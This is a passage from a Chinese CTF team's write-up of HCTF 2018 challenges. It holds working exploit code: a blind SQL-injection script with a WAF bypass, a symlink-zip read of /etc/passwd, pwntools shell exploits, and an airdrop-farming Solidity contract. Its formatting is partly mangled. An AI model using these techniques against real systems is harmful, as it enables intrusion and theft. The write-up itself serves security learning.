class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'cipher.txt'</span>, <span class=\"string\">'r'</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">        text += line</span><br><span class=\"line\">b = base64.b64decode(text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">normalized_distances = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> KEYSIZE <span class=\"keyword\">in</span> range(<span class=\"number\">2</span>, <span class=\"number\">40</span>):</span><br><span class=\"line\">    b1 = b[: KEYSIZE]</span><br><span class=\"line\">    b2 = b[KEYSIZE: KEYSIZE * <span class=\"number\">2</span>]</span><br><span class=\"line\">    b3 = b[KEYSIZE * <span class=\"number\">2</span>: KEYSIZE * <span class=\"number\">3</span>]</span><br><span class=\"line\">    b4 = b[KEYSIZE * <span class=\"number\">3</span>: KEYSIZE * <span class=\"number\">4</span>]</span><br><span class=\"line\">    b5 = b[KEYSIZE * <span class=\"number\">4</span>: KEYSIZE * <span class=\"number\">5</span>]</span><br><span class=\"line\">    b6 = b[KEYSIZE * <span class=\"number\">5</span>: KEYSIZE * <span class=\"number\">6</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    normalized_distance = float(</span><br><span class=\"line\">        hamming_distance(b1, b2) +</span><br><span class=\"line\">        hamming_distance(b2, b3) +</span><br><span class=\"line\">        hamming_distance(b3, b4) +</span><br><span class=\"line\">        hamming_distance(b4, b5) +</span><br><span class=\"line\">        hamming_distance(b5, b6)</span><br><span class=\"line\">    ) / (KEYSIZE * <span class=\"number\">5</span>)</span><br><span class=\"line\">    normalized_distances.append(</span><br><span class=\"line\">        (KEYSIZE, normalized_distance)</span><br><span class=\"line\">    )</span><br><span class=\"line\">normalized_distances = sorted(normalized_distances, key=<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> KEYSIZE, _ <span class=\"keyword\">in</span> normalized_distances[:<span class=\"number\">5</span>]:</span><br><span class=\"line\">    block_bytes = [[] <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> range(KEYSIZE)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i, byte <span class=\"keyword\">in</span> enumerate(b):</span><br><span class=\"line\">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class=\"line\">    keys = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> bbytes <span class=\"keyword\">in</span> block_bytes:</span><br><span class=\"line\">            keys += break_single_key_xor(bbytes)</span><br><span class=\"line\">        key = bytearray(keys * len(b), <span class=\"string\">\"utf-8\"</span>)</span><br><span class=\"line\">        plaintext = bxor(b, key)</span><br><span class=\"line\">        print(<span class=\"string\">\"keysize:\"</span>, KEYSIZE)</span><br><span class=\"line\">        print(<span class=\"string\">\"key is:\"</span>, keys, <span class=\"string\">\"n\"</span>)</span><br><span class=\"line\">        s = bytes.decode(plaintext)</span><br><span class=\"line\">        print(s)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure></p>\n<p>最后的结果:<br>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## blockchain</span><br><span class=\"line\"></span><br><span class=\"line\">### bet2loss</span><br><span class=\"line\"></span><br><span class=\"line\">一血！是个dice2win早期版本+erc20的题目，开奖函数可以重放，但是没看出来通过哪一步的重放能获得token。</span><br><span class=\"line\">每个账号会空投1000 token，只需要一万个账号就可以拿到flag。遂发动薅羊毛攻击。还是很慢，希望下次换个链哈哈哈。</span><br></pre></td></tr></table></figure></p>\n<p>pragma solidity ^0.4.20;<br>contract Attack_7878678 {<br>//    address[] private son_list;</p>\n<pre><code>function Attack_7878678() payable {}\n\nfunction attack_starta(uint256 reveal_num) public {\n    for(int i=0;i&lt;=50;i++){\n        son = new Son(reveal_num);\n    }\n}\n\nfunction () payable {\n}\n</code></pre><p>}</p>\n<p>contract Son_7878678 {</p>\n<pre><code>function Son_7878678(uint256 reveal_num) payable {\n    address game = 0x006b9bc418e43e92cf8d380c56b8d4be41fda319;\n    game.call(bytes4(keccak256(&quot;settleBet(uint256)&quot;)),reveal_num);\n    game.call(bytes4(keccak256(&quot;transfer(address,uint256)&quot;)),0x5FA2c80DB001f970cFDd388143b887091Bf85e77,950);\n}\nfunction () payable{\n}\n</code></pre><p>}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>hctf{Ohhhh_r3p1ay_a77ack_f0r_c0n7r4ct}<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">### ez2win</span><br></pre></td></tr></table></figure></p>\n<p>_transfer(address from, address to, uint256 amount);<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">未设置权限，可以随便转。开源了以后很简单就能拿到flag。</span><br></pre></td></tr></table></figure></p>\n<p>hctf{0hhhh_m4k3_5ur3_y0ur_acc35s_c0n7r01}<br><code>`</code></p>\n","site":{"data":{}},"excerpt":"<p>来自杭电师傅的HCTF，比赛很有趣！本次比赛线上赛我们好像是第四还是第五，线下赛是Henryzhao，姚老板和禹越去的，拿了线下赛第一吼吼~</p>","more":"<h2 id=\"web\"><a href=\"#web\" class=\"headerlink\" title=\"web\"></a>web</h2><h3 id=\"warmup\"><a href=\"#warmup\" class=\"headerlink\" title=\"warmup\"></a>warmup</h3><p>phpmyadmin4.8.1的文件包含漏洞，截取和转义的问题。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://warmup.2018.hctf.io/index.php?file=hint.php%253f/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>\n<h3 id=\"kzone\"><a href=\"#kzone\" class=\"headerlink\" title=\"kzone\"></a>kzone</h3><p>扫描目录发现/<a href=\"http://www.zip有源码，下载之，开始审计\" target=\"_blank\" rel=\"noopener\">www.zip有源码，下载之，开始审计</a><br>同时搜到了题目源码的出处，来自一个钓鱼网站模板；也搜到了一篇针对这个模板进行渗透的文章 <a href=\"https://bbs.ichunqiu.com/article-1518-1.html\" target=\"_blank\" rel=\"noopener\">https://bbs.ichunqiu.com/article-1518-1.html</a></p>\n<p>/include/member.php存在注入，但是需要绕过safe.php的waf<br>在member.php中发现了json_decode<br>可以解析\\u0020这样的unicode编码<br>所以所有被waf检测到的字符全部使用此编码绕过<br>首先注出了后台账号密码 尝试登录但后台没有东西 于是猜测flag在数据库中 继续用脚本注入得到flag<br>注入的时候还碰到了大小写不敏感的问题 使用binary可以解决<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\">url = &quot;http://kzone.2018.hctf.io/admin/login.php&quot;</span><br><span class=\"line\">flag = &apos;&apos;</span><br><span class=\"line\">dic = &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;_ABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;()*+|,-./:;&lt;=&gt;?@&quot;</span><br><span class=\"line\">for x in range(1,50):</span><br><span class=\"line\">    for i in dic:</span><br><span class=\"line\">        startTime = time.time()</span><br><span class=\"line\">        #poc = &quot;&apos;\\u006fr\\u0020su\\u0062str(passwo\\u0072d,&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,chr(i))</span><br><span class=\"line\">        #admin BE933CBA048A9727A2D2E9E08F5ED046</span><br><span class=\"line\">        #poc = &quot;&apos;\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020table_name\\u0020from\\u0020inf\\u006frmation_schema.tables\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,i)</span><br><span class=\"line\">        #F1444g</span><br><span class=\"line\">        #poc = &quot;&apos;\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020column_name\\u0020from\\u0020inf\\u006frmation_schema.columns\\u0020where\\u0020TABLE_SCHEMA\\u003ddatabase()\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,i)</span><br><span class=\"line\">        #F1a9</span><br><span class=\"line\">        poc = &quot;&apos;\\u006fr\\u0020su\\u0062str((select\\u0020binary\\u0020F1a9\\u0020from\\u0020F1444g\\u0020limit\\u00200,1),&#123;0&#125;,1)\\u003d&apos;&#123;1&#125;&apos;\\u0020and\\u0020sl\\u0065ep(6)\\u0023&quot;.format(x,i)</span><br><span class=\"line\">        headers = &#123;&quot;Cookie&quot;:&apos;islogin=1; login_data=&#123;\\&quot;admin_user\\&quot;:\\&quot;&apos;+poc+&apos;\\&quot;&#125;&apos;&#125;</span><br><span class=\"line\">        r = requests.get(url,headers=headers)</span><br><span class=\"line\">        if time.time() - startTime &gt; 5:</span><br><span class=\"line\">            flag += i</span><br><span class=\"line\">            print flag</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"admin\"><a href=\"#admin\" class=\"headerlink\" title=\"admin\"></a>admin</h3><p>这简直是我做ctf以来最神奇的一次经历<br>先是在fuzz过程中莫名其妙的拿到了flag<br>这一点其实想看看出题大佬怎么说的，感觉是后端数据库刷新的时候验证用户会出现问题。因为后来又复现成功了一次，具体操作是：在整点的时候注册admin账户提示已存在-&gt;再注册自己的账户提示注册成功后直接弹出flag，如下图…</p>\n<p><img src=\"http://cur5s-1.oss-cn-beijing.aliyuncs.com/18-11-12/75374228.jpg\" alt></p>\n<p>根据flag的内容知道考点是unicode cheat…队友研究了一波<br>注册 ᴬdmin，登录后修改密码，数据库会将真实admin的密码修改掉，然后再登录admin就可以了。<br>而后队友下午再次尝试复现的时候发现题目竟然在修改密码的页面给了源码…</p>\n<p>然后我们就成了 获得flag-&gt;根据flag获知解题方法-&gt;发现题目竟然给出了源码<br>ctf史上第一支倒着做题的队伍（手动捂脸<br>坐等官方大佬的wp解释一下非预期解的问题，估计有不少做出这道题的队伍是先拿到了flag</p>\n<h3 id=\"hideandseek\"><a href=\"#hideandseek\" class=\"headerlink\" title=\"hideandseek\"></a>hideandseek</h3><p>这题还是有意思，做起来每一步都很有道理，我们队好几个人一起做出来这个题。</p>\n<ol>\n<li>登录进去后，提示上传一个zip文件，发现他会cat这个文件，想到以前见过的上传硬连接。<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ln -s /etc/passwd ./templink</span><br><span class=\"line\">zip --symlink -r lala.zip ./templink</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>上传即可</p>\n<ol start=\"2\">\n<li>信息收集<br>权限很低，很多都读不了，但还是可以看看/proc下面的各种内容。</li>\n</ol>\n<ul>\n<li>/proc/self/environ，找到web服务目录。</li>\n<li>/app/hard_t0_guess_n9f5a95b5ku9fg/hard_t0_guess_also_df45v48ytj9_main.py 是运行的文件</li>\n<li>/app/hard_t0_guess_n9f5a95b5ku9fg/flag.py 不能直接读，尴尬</li>\n<li>/app/hard_t0_guess_n9f5a95b5ku9fg/templates/index.html 读模板</li>\n</ul>\n<ol start=\"3\">\n<li>cookie伪造<br>看到key是随机数生成的，种子是uuid，uuid.getnode()是mac地址，可以<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /sys/class/net/eth0/address</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>伪造一个username=admin的cookie就好啦。</p>\n<h3 id=\"game\"><a href=\"#game\" class=\"headerlink\" title=\"game\"></a>game</h3><p>这题目也很有趣，可以随意注册，登陆以后可以看到所有注册了的人的列表。看其他人注册了好多，思考为什么这么做。各种注入都试了，没有注入点。<br>看到了order=score，试着order=id，name都可以，又试着order=password，发现也行，震惊！<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import string</span><br><span class=\"line\">import os, random</span><br><span class=\"line\"></span><br><span class=\"line\">guess_list = string.printable</span><br><span class=\"line\"></span><br><span class=\"line\">old_password = &apos;dsA8&amp;&amp;!@#$%^&amp;D1NgY1as3DjA&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">def encode(length, op):</span><br><span class=\"line\">    a = &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, length/2))</span><br><span class=\"line\">    a += (op+&apos;&apos;.join(random.sample(string.ascii_letters + string.digits, 2))).encode(&apos;base64&apos;)[:-1]</span><br><span class=\"line\">    a += &apos;&apos;.join(random.sample(string.ascii_letters + string.digits, length/2))</span><br><span class=\"line\">    return a</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">for op in guess_list:</span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">\t    &apos;username&apos;: &apos;TuTuXiXiHHH&apos;+ encode(len(old_password),op),</span><br><span class=\"line\">\t    &apos;password&apos;: old_password + op,</span><br><span class=\"line\">\t    &apos;sex&apos;:&apos;1&apos;,</span><br><span class=\"line\">\t    &apos;submit&apos;:&apos;submit&apos;,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    requests.post(&quot;http://game.2018.hctf.io/web2/action.php?action=reg&quot;,data = data)</span><br><span class=\"line\">    print op, data</span><br></pre></td></tr></table></figure></p>\n<p>注册好多号不断的逼近admin的密码，登录后访问flag.php【user.php里有提示】，拿到flag。</p>\n<h2 id=\"pwn\"><a href=\"#pwn\" class=\"headerlink\" title=\"pwn\"></a>pwn</h2><h3 id=\"the-end\"><a href=\"#the-end\" class=\"headerlink\" title=\"the_end\"></a>the_end</h3><p>程序本身的功能为5次任意地址（用户输入）的1字节写随后调用exit()函数，且提供了sleep@libc的地址。通过单步跟踪exit()函数可以发现，程序在_dl_fini()函数中会<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call   QWORD PTR [rip+0x216414]        # 0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;</span><br></pre></td></tr></table></figure></p>\n<p>因此，只要将0x7ffff7ffdf48 &lt;_rtld_global+3848&gt;处修改为one_gadget的地址即可拿到shell，刚好需要修改5个字节。<br>由于程序关闭了stdout，拿到shell后，使用<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">exec</span> /bin/sh 1&gt;&amp;0</span><br></pre></td></tr></table></figure></p>\n<p>执行sh并重定向标准输出流到标准输入流，即可与shell正常交互。<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding=utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">pwn</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    BIN_PATH = <span class=\"string\">'./the_end'</span></span><br><span class=\"line\">    DEBUG = <span class=\"number\">1</span></span><br><span class=\"line\">    local = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> DEBUG == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> local == <span class=\"number\">1</span>:</span><br><span class=\"line\">            p = process(BIN_PATH)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            p = process(BIN_PATH, env=&#123;<span class=\"string\">'LD_PRELOAD'</span>: <span class=\"string\">'./libc.so.6'</span>&#125;)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\">        context.terminal = [<span class=\"string\">'tmux'</span>, <span class=\"string\">'split'</span>, <span class=\"string\">'-h'</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> context.arch == <span class=\"string\">'amd64'</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> local == <span class=\"number\">1</span>:</span><br><span class=\"line\">                libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            libc = ELF(<span class=\"string\">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        p = remote(<span class=\"string\">'150.109.44.250'</span>, <span class=\"number\">20002</span>)</span><br><span class=\"line\">        p.recvuntil(<span class=\"string\">'Input your token:'</span>)</span><br><span class=\"line\">        p.sendline(<span class=\"string\">'8RMQq9PuDRurd91OVhADpDDK30eqjAqz'</span>)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        libc = ELF(<span class=\"string\">'./libc.so.6'</span>)</span><br><span class=\"line\">        context.log_level = <span class=\"string\">'debug'</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> DEBUG == <span class=\"number\">1</span>:</span><br><span class=\"line\">        gdb.attach(p, gdbscript=<span class=\"string\">'b *0x0000555555554964'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">'here is a gift '</span>)</span><br><span class=\"line\">    recv = p.recvuntil(<span class=\"string\">','</span>, drop=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    libc.address = int(recv, <span class=\"number\">16</span>) - libc.symbols[<span class=\"string\">'sleep'</span>]</span><br><span class=\"line\">    <span class=\"keyword\">print</span> hex(libc.address)</span><br><span class=\"line\">    one_gadget = [<span class=\"number\">0x45216</span>, <span class=\"number\">0x4526a</span>, <span class=\"number\">0xf02a4</span>, <span class=\"number\">0xf1147</span>]</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">'luck ;)\\n'</span>)</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>)))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">0</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">1</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">1</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">2</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">2</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">3</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">3</span>])</span><br><span class=\"line\">    p.send(p64(libc.address + (<span class=\"number\">0x7ffff7ffdf48</span> - <span class=\"number\">0x00007ffff7a0d000</span>) + <span class=\"number\">4</span>))</span><br><span class=\"line\">    p.send(p64(libc.address + one_gadget[<span class=\"number\">2</span>])[<span class=\"number\">4</span>])</span><br><span class=\"line\">    <span class=\"comment\"># exec /bin/sh 1&gt;&amp;0</span></span><br><span class=\"line\">    p.interactive()</span><br><span class=\"line\">    p.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    pwn()</span><br></pre></td></tr></table></figure></p>\n<p>flag:<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">### babyprintf_ver2</span><br><span class=\"line\"></span><br><span class=\"line\">该程序通过read向bss上的全局变量输入数据，其后是stdout指针，可以进行覆盖篡改。由于知道bss的地址，首先将stdout指针的值修改为bss的地址，并在bss上布置虚假的stdout的FILE结构体，vtable地址由于程序本身带有检测，会自动填入。通过设置FILE结构体中的缓冲区指针，泄漏libc地址和修改__malloc_hook的值为one_gadget。最后通过触发printf_chk的报错使得程序调用malloc函数进而getshell。</span><br><span class=\"line\">```python</span><br><span class=\"line\"># coding=utf-8</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">def pwn():</span><br><span class=\"line\">    BIN_PATH = &apos;./babyprintf_ver2&apos;</span><br><span class=\"line\">    DEBUG = 0</span><br><span class=\"line\">    context.arch = &apos;amd64&apos;</span><br><span class=\"line\">    if DEBUG == 1:</span><br><span class=\"line\">        p = process(BIN_PATH)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        context.log_level = &apos;debug&apos;</span><br><span class=\"line\">        context.terminal = [&apos;tmux&apos;, &apos;split&apos;, &apos;-h&apos;]</span><br><span class=\"line\">        if context.arch == &apos;amd64&apos;:</span><br><span class=\"line\">            libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        p = remote(&apos;150.109.44.250&apos;, 20005)</span><br><span class=\"line\">        elf = ELF(BIN_PATH)</span><br><span class=\"line\">        libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class=\"line\">        p.recvuntil(&apos;Input your token:&apos;)</span><br><span class=\"line\">        p.sendline(&apos;8RMQq9PuDRurd91OVhADpDDK30eqjAqz&apos;)</span><br><span class=\"line\">        context.log_level = &apos;debug&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    p.recvuntil(&apos;buffer location to&apos;)</span><br><span class=\"line\">    recv = p.recvuntil(&apos;\\n&apos;, drop=True)</span><br><span class=\"line\">    bss_address = int(recv, 16)</span><br><span class=\"line\">    p.recvuntil(&apos;Have fun!\\n&apos;)</span><br><span class=\"line\">    payload = &apos;a&apos; * 16 + p64(bss_address + 0x20) + p64(0) + p64(0x00000000fbad2884) + p64(bss_address + 0xf8) * 3</span><br><span class=\"line\">    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x100) + p64(bss_address + 0x11d)</span><br><span class=\"line\">    payload += p64(bss_address + 0xf8) + p64(bss_address + 0x11d) + p64(0) * 5 + p64(1) + p64(0xffffffffffffffff) + p64(0x0000000000000000)</span><br><span class=\"line\">    payload += p64(bss_address + 0x130) + p64(0xffffffffffffffff) + p64(0) * 5 + p64(0x00000000ffffffff)</span><br><span class=\"line\"></span><br><span class=\"line\">    p.sendline(payload)</span><br><span class=\"line\">    p.recvuntil(&apos;permitted!\\n&apos;)</span><br><span class=\"line\">    p.sendline(&apos;a&apos; * 8)</span><br><span class=\"line\">    recv = p.recv(8)</span><br><span class=\"line\">    libc.address = u64(recv) - (0x7ffff7dcc2a0 - 0x7ffff79e4000)</span><br><span class=\"line\">    print hex(libc.address)</span><br><span 